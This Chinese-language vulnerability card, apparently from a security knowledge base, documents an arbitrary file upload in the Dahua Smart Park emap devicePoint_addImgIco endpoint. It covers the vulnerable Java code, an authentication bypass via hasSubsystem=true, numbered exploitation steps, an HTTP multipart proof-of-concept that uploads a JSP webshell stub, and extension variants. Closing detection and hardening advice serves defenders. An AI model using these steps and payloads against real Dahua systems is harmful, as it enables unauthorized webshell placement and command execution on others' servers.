---
id: web-java-component-dahua-emap-devicepoint-addingico-upload
title: 大华智慧园区 emap devicePoint_addImgIco 任意文件上传：后缀取自上传文件名并写入 webapps/upload/emap/society_new
type: scenario
domain: web
path: web/java/component
technique: dahua-emap-devicepoint-addingico-file-upload
tags:
- java
- dahua
- wpms
- file-upload
- struts2
- webshell
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V383
  verified_at: '2026-11-09T08:53:58+08:00'
  notes: 已对照原文核对：PoiAction.addImgIco 固定目录 Constants.TARGETSOCIETYIMGPATH(/opt/tomcat/webapps/upload/emap/society_new)、后缀取 uploadFileName 最后一段、ico_res_UUID.substring(20)_on_后缀、响应回显文件名，与截图一致；未验证点：原文仅以 test123 内容上传并返回 ico_res_70a2ea4fdac1_on.jsp，未访问执行 JSP，实际解析依赖容器与目录映射。
url: /docs/web/java/component/web-java-component-dahua-emap-devicepoint-addingico-upload/
draft: false
kb_aliases:
- devicePoint_addImgIco
- PoiAction addImgIco
- emap 任意文件上传
- ico_res 文件名
- TARGETSOCIETYIMGPATH
---

## 一句话结论

大华智慧园区 emap 模块的 `PoiAction.addImgIco`（`/emap/devicePoint_addImgIco`）把上传文件写入固定目录 `/opt/tomcat/webapps/upload/emap/society_new`，保存文件名由 `ico_res_<UUID片段>_on_<原文件后缀>` 拼接，后缀直接取上传文件名的最后一段且不做白名单校验，接口还把最终文件名回显在响应里；攻击者上传 `1.jsp` 即得到 `ico_res_xxx_on.jsp`，文件落在 Web 容器可访问目录，形成任意文件上传/WebShell 写入。

## 原理

- **入口**：Struts2 action `com.dahuatech.emap.mapbiz.poi.action.PoiAction` 的 `addImgIco()`；请求字段名为 `upload`（multipart）。
- **写文件逻辑**：
  ```java
  String picLoadDir = Constants.TARGETSOCIETYIMGPATH; // /opt/tomcat/webapps/upload/emap/society_new
  File dir = new File(picLoadDir); if (!dir.exists()) dir.mkdirs();
  String backStr = this.uploadFileName.substring(this.uploadFileName.lastIndexOf(".") + 1);
  fileName = "ico_res_" + UUIDUtil.getUUIDStr().substring(20) + "_on_" + backStr;
  File uploadFile = new File(dir, fileName);
  // 从上传流读字节写入 uploadFile
  SyncPoiTrigger.triggerAddIcoTask(fileName, Operation.addImgIco);
  getReturnMessage().setCode(1);
  getReturnMessage().setData(fileName);
  ```
- **为什么危险**：后缀仅由 `lastIndexOf(".")` 截取，完全来自攻击者提供的文件名，无扩展名/MIME/内容校验；目标目录位于 `/opt/tomcat/webapps/upload`（Tomcat 的 `upload` Web 应用）之下，`.jsp` 会被容器按 JSP 解析；文件名虽带随机片段，但接口在 `data` 字段原样回显，攻击者可直接访问。
- **鉴权**：该 action 位于 emap 的 `MyInterceptor` 之后，可用同平台的“`hasSubsystem=true` 触发 NPE、catch 保持 permission=true”绕过未登录访问（见关联卡）；原文的利用请求未携带登录态。
- **危害**：任意文件上传到 Web 可访问目录 → 上传 JSP WebShell → 服务器命令执行；也可覆盖/投放静态资源。

## 触发条件

- 目标为大华智慧园区综合管理平台，`/emap/devicePoint_addImgIco` 可达。
- 能通过鉴权（未登录时使用 `hasSubsystem=true` 异常绕过，或已有会话/命中白名单 action）。
- 服务器为 Linux + Tomcat，`Constants.TARGETSOCIETYIMGPATH` 指向 Web 可访问目录（默认 `/opt/tomcat/webapps/upload/emap/society_new`）。
- 上传目录可写，容器解析该目录下的 JSP。

## 利用步骤

1. 确认接口存在：向 `/emap/devicePoint_addImgIco?hasSubsystem=true` 发送 multipart 请求。
2. 字段 `upload` 上传内容可控的文件，文件名设为 `1.jsp`（或 `x.jsp`）。
3. 触发 MyInterceptor 异常绕过（请求体不含 `subSystem`），使请求进入 `addImgIco`。
4. 从响应 `{"code":1,"data":"ico_res_<随机>_on.jsp"}` 取保存文件名。
5. 访问 `http://target/upload/emap/society_new/<返回文件名>`（或对应 Web 映射路径）验证 JSP 执行。
6. 验证后删除上传文件并停止；不要保留持久化后门。

## PoC

```http
POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----x
Content-Length: ...

------x
Content-Disposition: form-data; name="upload"; filename="1.jsp"
Content-Type: image/jpeg

<%@ page import="java.util.*,java.io.*" %><% ... %>
------x--
```

```json
// 200 OK
{"code":1,"data":"ico_res_70a2ea4fdac1_on.jsp"}
```

原文以内容 `test123` 的 `1.jsp` 实测返回上述响应，证明后缀与内容均未被校验、文件已写入固定目录。

## 变体与关联

- 变体：后缀换成 `.jspx`、`.jspf` 或大小写混合；文件名带多个点时取最后一段后缀。
- 变体：若随机片段导致无法直接猜路径，以响应 `data` 为准；也可先上传 `.txt` 验证写入再换 `.jsp`。
- 变体：同 action 的 `SyncPoiTrigger` 会触发后续任务，可作为文件落地的旁证。
- 关联：[[web-java-component-dahua-emap-myinterceptor-catch-auth-bypass]]（未授权到达本接口的绕过）、[[web-java-component-dahua-material-file-upload-webshell]]（同平台另一上传 sink）、[[web-java-component-dahua-publishing-userauthenticationfilter-path-whitelist-bypass]]（同平台另一鉴权绕过）。

## 检测与防御

- 防御：上传接口强制扩展名白名单（仅图片），校验 MIME 与文件魔数，服务端重命名且不带原始后缀；上传目录移出 Web 根并禁止脚本解析。
- 防御：修复 MyInterceptor 的 fail-open 逻辑（见关联卡），确保上传接口必须先经过有效鉴权。
- 检测：multipart 文件名以 `.jsp`/`.jspx` 结尾；`/emap/devicePoint_addImgIco` 请求；`webapps/upload/emap/society_new` 下出现非图片内容的新文件；上传后短时间内访问该新文件。
